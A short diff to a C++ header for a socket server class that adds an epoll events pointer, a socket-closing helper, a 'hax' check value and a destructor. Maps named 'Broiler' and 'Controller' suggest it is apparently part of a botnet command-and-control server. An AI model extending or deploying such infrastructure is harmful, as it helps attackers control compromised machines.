@@ -19,6 +19,7 @@ using namespace std;
 class Csocket
 {
 private:
+     char hax_init[17]="wwwwwwwwwwwwwwww";
     Base *base;
     int serever_socket;
     int epoll_fd;
@@ -27,6 +28,7 @@ private:
         int port;
         int socket;
     };
+    struct epoll_event *events;
     map<int,info> Broiler;
     map<string,int> Controller;
     struct sockaddr_in server_in ;
@@ -36,7 +38,10 @@ private:
     void epoll_while(void);
     void accept_coon(void);
     void coon_recv(int coon);
+    void close_socket(int coon);//关闭一个socket和取消epoll的注册
+    bool hax_judge(char *req);//hax值的判断
 public:
     void serever_init(char *ip,int port);
     void run();
+    ~Csocket();
 };
